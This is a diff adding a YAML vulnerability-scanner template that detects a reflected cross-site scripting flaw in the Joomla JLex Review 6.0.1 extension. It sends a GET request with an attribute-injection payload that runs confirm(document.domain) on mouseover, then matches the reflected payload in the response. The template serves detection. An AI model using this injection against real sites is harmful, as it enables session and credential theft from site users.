@@ -1,0 +1,24 @@
+id: joomla-jlex-xss
+brief:
+    title: Joomla JLex Review 6.0.1 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credenti...
+    label:
+        - joomla
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1'
+      signs:
+        - "on": word
+          has:
+            - <a href="/?itwed"onmouseover="confirm(document.domain)"style=
+            - jlex-review
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
